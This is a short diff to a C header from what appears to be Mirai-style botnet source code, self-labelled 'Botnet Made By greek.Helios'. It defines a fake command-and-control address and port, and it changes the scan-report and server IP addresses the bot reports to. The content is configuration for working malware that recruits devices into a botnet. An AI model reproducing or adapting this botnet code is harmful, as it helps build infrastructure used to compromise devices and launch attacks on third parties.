@@ -21,8 +21,8 @@ typedef uint16_t port_t;
 #define FAKE_CNC_ADDR (int)inet_addr((const char*)"Botnet Made By greek.Helios");
 #define FAKE_CNC_PORT 701
 
-#define SCANIP (int)inet_addr((const char*)"192.168.1.4");
-#define SERVIP (int)inet_addr((const char*)"192.168.1.4");
+#define SCANIP (int)inet_addr((const char*)"172.17.0.21");
+#define SERVIP (int)inet_addr((const char*)"172.17.0.21");
                                                               
 ipv4_t LOCAL_ADDR;
 
